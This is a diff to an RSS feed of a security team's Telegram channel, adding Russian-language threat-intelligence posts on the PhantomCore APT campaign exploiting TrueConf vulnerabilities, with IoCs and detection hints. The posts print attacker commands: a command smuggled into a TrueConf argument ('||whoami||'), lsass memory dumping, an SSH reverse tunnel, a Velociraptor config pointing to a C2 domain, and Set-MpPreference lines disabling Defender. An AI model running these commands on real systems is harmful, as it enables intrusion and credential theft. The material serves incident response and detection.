@@ -1,5 +1,97 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ESCalator</title><link>https://t.me/ptescalator</link><description>Tips and tricks Positive Technologies (PT ESC)</description><language>ru</language><lastBuildDate>Sat, 06 Dec 2025 08:06:31 +0000</lastBuildDate><item><title>Message 576</title><link>https://t.me/ptescalator/576</link><description/><pubDate>Sat, 06 Dec 2025 08:06:31 +0000</pubDate><guid isPermaLink="false">telegram_ptescalator_576</guid></item><item><title>В дополнение к посту 👆</title><link>https://t.me/ptescalator/575</link><description>В дополнение к посту 👆
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ESCalator</title><link>https://t.me/ptescalator</link><description>Tips and tricks Positive Technologies (PT ESC)</description><language>ru</language><lastBuildDate>Wed, 10 Dec 2025 10:28:30 +0000</lastBuildDate><item><title>В дополнение к посту выше 👆</title><link>https://t.me/ptescalator/578</link><description>В дополнение к посту выше 👆
+🐾 Paths
+c:\Windows\ime\ssh.msi
+c:\Windows\ime\k.msi
+C:\Program Files\TrueConf Server\httpconf\site\private\css\c.css
+C:\Program Files\TrueConf Server\httpconf\site\public\rx.exe
+C:\Program Files\TrueConf Server\httpconf\site\public\ws.dll
+C:\TrueConf\activation\offlinereg.vrg
+C:\Windows\System32\Windows Security Health\SecurityHealhAgent.exe
+C:\Windows\System32\dfxhost.dll
+Check-Update.xml
+Check-Update.ps1
+Create-Check-Update-Task.ps1
+🧑‍💻 IoCs
+HeartDoor
+8f2f31aaa46920efdfa622b52cd8cd53
+fde9563317a0c0249447b123b2137b0e
+185.189.12.166
+PhantomSscp
+e5b540f47ec1707fcd9980ab426be115
+4b2ce3df0bae02806a72139b5d9e9a55
+486faa9e2efbf78d4c03ba5dfe72eb1d
+99ef13d85d2b45cb24a86f1e9923d63a
+reserve-safe.online
+online-channel.online
+infonixsecurity.online
+xbox-updater.online
+MacTunnelRAT
+a346f2145bb7b3cce7c8c8c4d88d4678
+c549a2e6533e73ea39bfa466e5e6dcd8
+ad64f8c8469c87ed0c395c8936550af6
+cyberposi.space
+nexaguard.space
+solution-itspace.online
+moscow-tv.online
+analytisec.space
+safebloom.space
+cloud-update.online
+shieldify.online
+optivault.space
+brightshield.space
+trustbeam.space
+188.127.227.46
+Velociraptor
+d91f8fb7ee4ec98bd80bad69d7667842
+telecom-connect.online
+Stage Hub
+31.57.93.105
+SSH Tunnel Control Panel
+77.73.39.120
+191.101.184.123
+#ioc #dfir #ti #ir #detect #apt #PhantomCore
+@ptescalator</description><pubDate>Wed, 10 Dec 2025 10:28:30 +0000</pubDate><guid isPermaLink="false">telegram_ptescalator_578</guid></item><item><title>Operation CyberPosi 🤔</title><link>https://t.me/ptescalator/577</link><description>Operation CyberPosi 🤔
+Команда PT ESC IR совместно с командой Threat Intelligence наблюдают новую кампанию APT-группировки PhantomCore, в которой атакующие массово взламывают компании через цепочку уязвимостей (BDU:2025-10114, BDU:2025-10115, BDU:2025-10116) в сервисе видеоконференцсвязи TrueConf.
+Информация про уязвимости в сервисе была опубликована в августе в БДУ ФСТЭК, а также были выпущены рекомендации по обновлению. Ранее про использование данных уязвимостей сообщали специалисты RED Security в своем материале.
+👀 Пример выполнения команды после эксплуатации от имени процесса tc_server.exe:
+cmd.exe /s /c "C:\\Program Files\\TrueConf Server\\tc_server.exe" /mode:1 /ServerID:a /ServerName:aaa1111#vcs /Serial:||whoami|| /File:"C:\\TrueConf\\activation\\offlinereg.vrg"
+Пример события в журналах для обнаружения фактов компрометации:
+error: the required argument for option '--Serial' is missing
+Получив доступ в инфраструктуру, атакующие действуют достаточно избирательно и используют разные техники для маскировки своей активности под действия специалистов по информационной безопасности.
+После этого атакующие развивают атаку в сети и продвигаются в инфраструктуре, используя протоколы удаленного управления WinRM и RDP. Использование WinRM можно мониторить в событиях Windows, а также в реестре:
+\Microsoft\Windows\CurrentVersion\WSMAN\SafeClientList\WSManSafeClientList
+Для развития атаки и получения доступа к привилегированным учетным записям злоумышленники получали дамп процесса lsass, используя для этого такие инструменты, как:
+• DFIR-утилита для создания дампа оперативной памяти DumpIt (DumpIt.exe /O dump.dmp)
+• библиотека файловой системы Dokan
+• утилита для анализа дампов оперативной памяти MemProcFS (memprocfs.exe -device dump.dmp / M:\name\lsass.exe-123\minidump)
+На хостах атакующие закреплялись, используя в первую очередь ряд собственных инструментов:
+• HeartDoor
+• MacTunnelRAT (предназначен для создания обратного SSH-туннеля)
+• PhantomSscp (предназначен для создания обратного SSH-туннеля)
+• OpenSSH (ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=15 -f -N -R 39433 -p 443 [REDACTED]@[REDACTED])
+• Velociraptor
+Особое внимание мы обращаем на установку утилиты Velociraptor, которая, как правило, используется специалистами в ходе расследования инцидентов информационной безопасности, а атакующими — для удаленного управления. Ранее про использование DFIR-инструмента атакующими сообщали специалисты Solar 4RAYS.
+Пример конфигурации:
+version:
+name: velociraptor
+version: 0.74.2
+commit: 121178eb6
+build_time: "2025-04-20T01:04:04Z"
+...
+Client:
+server_urls:
+- https://telecom-connect.online/
+windows_installer:
+service_name: WindowsSecurityAgentSvc
+install_path: C:\Windows\System32\Windows Security Health\SecurityHealhAgent.exe
+service_description: Windows Security Agent Service
+...
+Файловые пути и IoCs в посте ниже 🔽
+#ioc #dfir #ti #ir #detect #apt #PhantomCore
+@ptescalator
+
+[Media: Фото]</description><pubDate>Wed, 10 Dec 2025 10:27:52 +0000</pubDate><guid isPermaLink="false">telegram_ptescalator_577</guid></item><item><title>Message 576</title><link>https://t.me/ptescalator/576</link><description/><pubDate>Sat, 06 Dec 2025 08:06:31 +0000</pubDate><guid isPermaLink="false">telegram_ptescalator_576</guid></item><item><title>В дополнение к посту 👆</title><link>https://t.me/ptescalator/575</link><description>В дополнение к посту 👆
 Отключение Defender / MpPreference
 Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -DisableBehaviorMonitoring $true
